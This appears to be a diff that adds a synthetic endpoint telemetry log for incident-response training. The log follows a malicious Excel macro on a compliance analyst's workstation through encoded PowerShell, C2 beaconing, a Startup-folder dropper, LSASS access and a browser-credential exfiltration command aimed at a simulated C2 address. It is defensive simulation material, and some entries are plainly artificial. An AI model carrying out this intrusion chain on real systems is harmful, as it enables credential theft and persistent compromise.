@@ -1,0 +1,51 @@
+# SIMULATED ENDPOINT TELEMETRY LOG
+# Host: WS-NYC-ALICE02 | User: ALICE.CHEN | Domain: CORP.GSINTERNAL.LOCAL
+# Role: Senior Compliance Analyst | Timezone: EDT (UTC-4)
+# Format: TIMESTAMP | SEVERITY | SOURCE | EVENT_ID | USER | PROCESS | DESCRIPTION
+# NOTE: Synthetic data for training/incident response simulation only.
+
+2026-04-01 08:01:15.332 | INFO | SECURITY | 4624 | ALICE.CHEN | winlogon.exe | Successful interactive logon. Workstation: WS-NYC-ALICE02
+2026-04-01 08:02:44.118 | INFO | SYSMON | 1 | ALICE.CHEN | explorer.exe | Process created. Parent: userinit.exe
+2026-04-01 08:15:09.776 | INFO | APPLICATION | 1001 | ALICE.CHEN | OUTLOOK.EXE | Mailbox sync completed. 287 items processed.
+2026-04-01 09:30:22.445 | INFO | SYSMON | 1 | ALICE.CHEN | EXCEL.EXE | Process created. Parent: explorer.exe
+2026-04-01 09:31:10.889 | INFO | SYSMON | 11 | ALICE.CHEN | EXCEL.EXE | File opened: C:\Users\ALICE.CHEN\Documents\Compliance_Checklist_Q1.xlsm
+2026-04-01 10:45:33.221 | INFO | NETWORK | 3 | SYSTEM | EXCEL.EXE | TCP connection to 10.12.44.22:443 (Internal SharePoint)
+2026-04-01 12:00:00.001 | INFO | SECURITY | 4802 | SYSTEM | scrnsave.scr | Screen saver activated. Workstation locked.
+2026-04-01 12:45:18.664 | INFO | SECURITY | 4803 | ALICE.CHEN | logonui.exe | Workstation unlocked via Windows Hello.
+2026-04-01 14:20:55.112 | INFO | FILE | 11 | ALICE.CHEN | EXCEL.EXE | File saved: C:\Users\ALICE.CHEN\Documents\Audit_Trail_Draft.xlsx
+2026-04-01 17:30:02.887 | INFO | SECURITY | 4634 | SYSTEM | winlogon.exe | User logoff. Session 2 ended.
+2026-04-01 17:30:05.443 | INFO | POWER | 42 | SYSTEM | kernel | System entering sleep state (S3).
+
+2026-04-02 08:10:33.204 | INFO | SECURITY | 4624 | ALICE.CHEN | winlogon.exe | Successful interactive logon. Host: WS-NYC-ALICE02
+2026-04-02 08:25:17.556 | INFO | SYSMON | 1 | ALICE.CHEN | OUTLOOK.EXE | Process created. Parent: explorer.exe
+2026-04-02 09:15:44.892 | INFO | EMAIL_GW | 4501 | EXCH_MTA | - | Internal email processed: Subject='Updated KYC Templates'. Sender='compliance-internal@gsinternal.local'
+2026-04-02 09:18:22.331 | INFO | FILE | 11 | ALICE.CHEN | OUTLOOK.EXE | Attachment saved: C:\Users\ALICE.CHEN\Downloads\KYC_Template_v3.xlsm
+2026-04-02 09:20:05.776 | INFO | SYSMON | 1 | ALICE.CHEN | EXCEL.EXE | Process created. File opened: KYC_Template_v3.xlsm
+2026-04-02 09:20:08.112 | WARN | SYSMON | 12 | SYSTEM | EXCEL.EXE | Registry event: Macro execution enabled. VBA Project: AutoOpen() triggered
+2026-04-02 09:20:11.445 | WARN | NETWORK | 3 | SYSTEM | EXCEL.EXE | Suspicious outbound: powershell.exe spawned, DNS query to update-cdn.msoffice365-verify[.]com
+2026-04-02 09:20:15.889 | WARN | SYSMON | 1 | SYSTEM | powershell.exe | Process created. Parent: EXCEL.EXE. Command: -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...
+2026-04-02 09:20:22.337 | WARN | REGISTRY | 13 | SYSTEM | powershell.exe | Persistence set: HKCU\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations\AllowSubdirectories = 1
+2026-04-02 10:00:00-17:45:00 | INFO | VARIOUS | - | ALICE.CHEN | - | Normal business activity: Teams, internal portals, document review. Background beaconing observed.
+2026-04-02 17:50:10.991 | WARN | NETWORK | 3 | SYSTEM | svchost_update.exe | Periodic beacon to 192.168.100.45:443 (Simulated internal C2)
+2026-04-02 18:05:22.337 | INFO | SECURITY | 4634 | SYSTEM | winlogon.exe | User logoff. Session 2 ended.
+2026-04-02 23:15:05.118 | WARN | NETWORK | 3 | SYSTEM | svchost_update.exe | Beacon persists during off-hours. TCP keepalive sent.
+
+2026-04-03 08:05:11.204 | INFO | SECURITY | 4624 | ALICE.CHEN | winlogon.exe | Successful interactive logon. Host: WS-NYC-ALICE02
+2026-04-03 08:30:00.000 | INFO | APPLICATION | 1001 | ALICE.CHEN | OUTLOOK.EXE | Mailbox sync completed.
+2026-04-03 11:20:33.112 | INFO | FILE | 11 | ALICE.CHEN | WINWORD.EXE | File saved: C:\Users\ALICE.CHEN\Documents\Policy_Review_April.docx
+2026-04-03 14:45:10.889 | INFO | SYSMON | 1 | ALICE.CHEN | TEAMS.EXE | Process created. Video conference started.
+2026-04-03 17:30:02.887 | INFO | SECURITY | 4634 | SYSTEM | winlogon.exe | User logoff. Session 2 ended.
+2026-04-03 20:45:44.221 | WARN | SECURITY | 4624 | ALICE.CHEN | winlogon.exe | Interactive logon after hours. Session 3 created.
+2026-04-03 20:50:15.445 | INFO | FILE | 11 | ALICE.CHEN | EXCEL.EXE | File reopened: C:\Users\ALICE.CHEN\Documents\Compliance_Checklist_Q1.xlsm
+2026-04-03 20:55:30.881 | WARN | SYSMON | 12 | SYSTEM | EXCEL.EXE | Macro re-executed. VBA: AutoOpen() -> spawned wscript.exe
+2026-04-03 20:55:33.003 | WARN | SYSMON | 1 | SYSTEM | wscript.exe | Process created. Parent: EXCEL.EXE. Command: wscript.exe //B C:\Users\ALICE.CHEN\AppData\Local\Temp\update.vbs
+2026-04-03 20:58:45.772 | WARN | NETWORK | 3 | SYSTEM | wscript.exe | Outbound connection to 192.168.100.45:443 (C2 channel established)
+2026-04-03 20:59:50.339 | WARN | FILE | 11 | SYSTEM | wscript.exe | Dropper executed. File written: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.exe
+2026-04-03 21:00:00.000 | CRIT | MALWARE | 0x7B3 | SYSTEM | OneDriveSync.exe | PAYLOAD DETONATED: Info-stealer + keylogger module activated.
+2026-04-03 21:00:04.221 | CRIT | SYSMON | 10 | SYSTEM | OneDriveSync.exe | Process access: Opened lsass.exe (PID 724) for memory read
+2026-04-03 21:00:09.884 | WARN | SECURITY | 4688 | SYSTEM | OneDriveSync.exe | Process created with suspicious command line: -steal --target browser --exfil https://192.168.100.45/api/v2/collect
+2026-04-03 21:00:15.445 | CRIT | NETWORK | 3 | SYSTEM | OneDriveSync.exe | Data exfiltration detected: POST /api/v2/collect (87 MB of browser credentials, cookies, documents)
+2026-04-03 21:00:22.992 | CRIT | EDR | 9002 | SYSTEM | OneDriveSync.exe | Behavioral alert: Credential dumping attempt via LSASS access + browser data theft
+2026-04-03 21:00:31.110 | WARN | REGISTRY | 13 | SYSTEM | OneDriveSync.exe | Registry modification: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell modified (persistence)
+2026-04-03 21:00:45.776 | CRIT | SYSTEM | 6008 | SYSTEM | kernel | Unexpected shutdown detected. Possible forced termination by EDR containment.
+2026-04-03 21:01:10.003 | ERROR | SECURITY | 4740 | SYSTEM | winlogon.exe | Account lockout event. User: ALICE.CHEN. Source: WS-NYC-ALICE02. Network isolation triggered.
